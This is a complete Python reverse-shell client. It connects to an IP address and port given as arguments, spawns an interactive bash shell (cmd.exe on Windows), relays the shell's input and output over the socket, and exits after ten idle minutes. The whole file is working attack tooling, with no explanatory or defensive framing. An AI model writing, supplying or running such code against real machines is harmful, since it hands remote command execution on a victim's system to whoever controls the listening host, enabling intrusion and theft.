import sys, platform
import socket, select, time
import os, threading
import subprocess as sp
import signal

IDLE_DISCONNECT_TIME_SEC = 600

if sys.version_info.major < 3:
    print("need python3 to run")
    exit(0)

signal.signal(signal.SIGINT, signal.SIG_DFL)

if len(sys.argv) != 3:
    print("invalid argument", sys.argv)
    exit(0)

print("OS is", platform.system())
ip = sys.argv[1]
port = int(sys.argv[2])
print("IP=", ip, ", ", "port=", port)

cmd_arr = ["bash", "-i"]
if platform.system() == "Windows":
    cmd_arr = ["cmd.exe"]

p = sp.Popen(cmd_arr, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

try:
    s.connect((ip, port))
except:
    print("failed to connect")
    exit(0)

print("connected")
s.settimeout(None)
s.send("hello message from client!!!!\n".encode())

def stdout_thread():
    while True:
        o = os.read(p.stdout.fileno(), 1024)
        s.send(o)


threading.Thread(target=stdout_thread, daemon=True).start()

last_active_time = time.time()

def stdin_thread():
    global last_active_time
    while True:
        i = s.recv(1024)
        if len(i) == 0:
            exit(0)
        last_active_time = time.time()
        os.write(p.stdin.fileno(), i)

threading.Thread(target=stdin_thread, daemon=True).start()

while True:
    print("current_time:", time.time(), ",  last active time:", last_active_time)
    sys.stdout.flush()
    if time.time() - last_active_time > IDLE_DISCONNECT_TIME_SEC:
        print("quit by idle")
        exit(0)
    time.sleep(5)
